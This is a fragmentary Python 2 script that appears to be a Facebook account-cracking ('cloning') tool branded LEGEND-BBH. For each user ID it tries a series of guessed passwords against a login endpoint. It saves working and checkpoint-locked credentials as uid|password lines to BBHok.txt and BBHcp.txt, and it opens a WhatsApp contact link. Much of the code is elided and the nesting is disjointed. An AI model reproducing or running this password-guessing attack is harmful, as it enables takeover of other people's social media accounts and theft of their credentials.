...
def main_select():
    ...
    if BBH == '':
        ...
        os.system('xdg-open https://api.whatsapp.com/send/?phone=%+8801314437492&text&app_absent=0')
        main()
    elif BBH == '4':
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('BBHok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('BBHcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('BBHok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('BBHcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('BBHok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('BBHcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('BBHok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('BBHcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('BBHok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('BBHcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEDEND-BBH-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('BBHok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('BBHcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('BBHok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[LEGEND-BBH-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('BBHcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
    ...
    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: BBHcp.txt'
    print 54 * '_'
    print ''
    print ''
                    ...
                    if 'access_token' in q:
                        ...
                        if 'access_token' in q:
                            ...
                            if 'access_token' in q:
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[LEGEND-BBH-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('BBHok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
